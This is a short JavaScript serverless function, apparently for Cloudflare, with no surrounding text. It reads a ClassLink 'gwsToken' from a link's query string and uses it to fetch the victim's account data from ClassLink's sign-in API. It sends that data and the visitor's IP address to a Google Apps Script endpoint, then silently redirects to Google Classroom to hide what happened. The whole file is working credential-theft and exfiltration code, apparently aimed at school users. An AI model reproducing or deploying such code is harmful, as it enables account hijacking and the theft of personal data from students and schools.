export async function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const idString = decodeURI(idMatch ? idMatch[1] : null);
    const ip = request.headers.get("CF-Connecting-IP");
    
    let id;
    try {
        id = idString.match(/gwsToken":\s*"(.+?)"/)[1];
    } catch (error) {}
    try {
        const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
            method: "GET",
            headers: {
                "gwsToken": id
            }
        });

        if (nodeApiResponse.ok) {
            const nodeApiData = await nodeApiResponse.json();

            await fetch("https://script.google.com/macros/s/AKfycbw2LaXahao4cjYHLIXED5cJNXwki2zon6pK0s6T8Qr5j7m14GbtzY-PKWq12cEBx_DA/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: nodeApiData, ip: ip })
            });
        }
    } catch (error) {}
    return Response.redirect("https://classroom.google.com", 302);
}
